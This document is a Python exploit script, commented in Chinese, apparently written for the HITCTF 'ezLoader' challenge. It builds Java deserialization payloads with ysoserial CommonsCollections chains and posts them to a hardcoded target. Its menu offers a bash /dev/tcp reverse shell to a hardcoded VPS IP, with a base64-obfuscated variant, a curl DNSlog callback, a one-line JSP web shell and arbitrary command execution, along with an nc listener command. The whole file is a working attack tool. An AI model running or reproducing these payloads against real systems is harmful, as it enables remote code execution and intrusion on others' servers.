#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
HITCTF - ezLoader 反序列化利用脚本
使用 CommonsCollections 链绕过黑名单
"""

import requests
import base64
import subprocess
import sys
import os

# 目标URL
TARGET_URL = "http://5bd9497ae8ad.target.yijinglab.com/unser"

# VPS监听地址(用于反弹shell或DNS外带)
VPS_IP = "116.62.211.91"
VPS_PORT = "4445"


def generate_payload_with_java_options(chain_name, command):
    """
    使用 ysoserial 生成 payload (支持 Java 17+)
    添加 --add-opens 参数绕过模块化限制
    """
    print(f"[*] 正在生成 {chain_name} payload: {command}")
    
    # 检查 ysoserial 是否存在
    ysoserial_path = "ysoserial.jar"
    if not os.path.exists(ysoserial_path):
        print("[!] 未找到 ysoserial.jar，请下载到当前目录")
        print("[!] 下载地址: https://github.com/frohoff/ysoserial/releases")
        return None
    
    try:
        # Java 17+ 需要添加 --add-opens 参数
        java_opts = [
            "--add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED",
            "--add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED",
            "--add-opens=java.base/java.net=ALL-UNNAMED",
            "--add-opens=java.base/java.util=ALL-UNNAMED",
            "--add-opens=java.base/sun.reflect.annotation=ALL-UNNAMED"
        ]
        
        # 生成 payload
        cmd = ["C:\\Program Files\\Eclipse Adoptium\\jdk-17.0.16.8-hotspot\\bin\\java.exe"] + java_opts + ["-jar", ysoserial_path, chain_name, command]
        
        result = subprocess.run(
            cmd,
            capture_output=True,
            timeout=10
        )
        
        if result.returncode != 0:
            stderr = result.stderr.decode('utf-8', errors='ignore')
            print(f"[!] ysoserial 执行失败: {stderr[:200]}")
            return None
            
        payload = result.stdout
        print(f"[+] Payload 生成成功，大小: {len(payload)} 字节")
        return payload
        
    except FileNotFoundError:
        print("[!] 未找到 java 命令，请确保已安装 Java")
        return None
    except subprocess.TimeoutExpired:
        print("[!] ysoserial 执行超时")
        return None
    except Exception as e:
        print(f"[!] 生成 payload 时出错: {e}")
        return None


def generate_payload_cc1(command):
    """CommonsCollections1 链"""
    return generate_payload_with_java_options("CommonsCollections1", command)


def generate_payload_cc6(command):
    """CommonsCollections6 链 (最稳定)"""
    return generate_payload_with_java_options("CommonsCollections6", command)


def generate_payload_cc3(command):
    """CommonsCollections3 链"""
    return generate_payload_with_java_options("CommonsCollections3", command)


def generate_payload_cc5(command):
    """CommonsCollections5 链"""
    return generate_payload_with_java_options("CommonsCollections5", command)


def generate_payload_urldns(domain):
    """URLDNS 链 (用于测试，无命令执行)"""
    return generate_payload_with_java_options("URLDNS", domain)


def exploit(payload_bytes, url=TARGET_URL):
    """
    发送 payload 到目标服务器
    """
    if not payload_bytes:
        print("[!] Payload 为空")
        return None
    
    # Base64 编码
    payload_b64 = base64.b64encode(payload_bytes).decode()
    print(f"[*] Base64 payload (前100字符): {payload_b64[:100]}...")
    
    # 构造请求
    data = {"data": payload_b64}
    
    print(f"[*] 正在发送 payload 到: {url}")
    
    try:
        response = requests.post(
            url,
            data=data,
            timeout=10,
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0"
            }
        )
        
        print(f"[+] 响应状态码: {response.status_code}")
        print(f"[+] 响应内容:\n{response.text[:500]}")
        
        return response
        
    except requests.exceptions.Timeout:
        print("[!] 请求超时，可能命令正在执行...")
        return None
    except requests.exceptions.ConnectionError:
        print("[!] 连接失败，请检查目标地址")
        return None
    except Exception as e:
        print(f"[!] 请求出错: {e}")
        return None


def get_reverse_shell_cmd(vps_ip, vps_port):
    """
    生成反弹shell命令(多种编码方式)
    """
    # Bash 反弹
    bash_cmd = f"bash -c 'bash -i >& /dev/tcp/{vps_ip}/{vps_port} 0>&1'"
    
    # Base64 编码绕过
    bash_b64 = base64.b64encode(f"bash -i >& /dev/tcp/{vps_ip}/{vps_port} 0>&1".encode()).decode()
    bash_b64_cmd = f"bash -c 'echo {bash_b64}|base64 -d|bash'"
    
    return {
        "bash": bash_cmd,
        "bash_b64": bash_b64_cmd
    }


def main():
    print("=" * 60)
    print("  HITCTF - ezLoader 反序列化利用工具")
    print("  绕过方式: CommonsCollections 链")
    print("=" * 60)
    print()
    
    if len(sys.argv) > 1:
        # 使用命令行参数
        command = " ".join(sys.argv[1:])
    else:
        # 交互式选择
        print("请选择攻击方式:")
        print("1. 执行自定义命令")
        print("2. 反弹shell")
        print("3. DNS外带测试")
        print("4. 写入WebShell")
        
        choice = input("\n请输入选项 [1-4]: ").strip()
        
        if choice == "1":
            command = input("请输入要执行的命令: ").strip()
            
        elif choice == "2":
            vps_ip = input(f"请输入VPS IP [{VPS_IP}]: ").strip() or VPS_IP
            vps_port = input(f"请输入监听端口 [{VPS_PORT}]: ").strip() or VPS_PORT
            
            shells = get_reverse_shell_cmd(vps_ip, vps_port)
            print("\n选择反弹方式:")
            print("1. 直接反弹 (bash)")
            print("2. Base64编码反弹")
            
            shell_choice = input("请选择 [1-2]: ").strip()
            if shell_choice == "2":
                command = shells["bash_b64"]
            else:
                command = shells["bash"]
            
            print(f"\n[!] 请在VPS上执行: nc -lvnp {vps_port}")
            input("按回车继续...")
            
        elif choice == "3":
            dnslog = input("请输入DNSlog域名 (例如: xxx.dnslog.cn): ").strip()
            command = f"curl http://{dnslog}"
            print(f"[*] 将执行: {command}")
            print("[!] 请在DNSlog平台查看记录")
            
        elif choice == "4":
            webshell_path = input("请输入写入路径 (例如: /tmp/shell.jsp): ").strip()
            webshell_content = '<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>'
            command = f"echo '{webshell_content}' > {webshell_path}"
            print(f"[*] 将写入: {webshell_path}")
            
        else:
            print("[!] 无效选项")
            return
    
    print(f"\n[*] 目标命令: {command}")
    print()
    
    # 尝试多个链 (按成功率排序)
    chains = [
        ("CommonsCollections6", generate_payload_cc6),
        ("CommonsCollections5", generate_payload_cc5),
        ("CommonsCollections3", generate_payload_cc3),
        ("CommonsCollections1", generate_payload_cc1),
    ]
    
    for chain_name, generator in chains:
        print(f"\n[*] 尝试使用 {chain_name} 链...")
        payload = generator(command)
        
        if payload:
            exploit(payload)
            print()
            
            retry = input("是否尝试下一条链? [y/N]: ").strip().lower()
            if retry != 'y':
                break
    
    print("\n[*] 攻击完成")


if __name__ == "__main__":
    main()
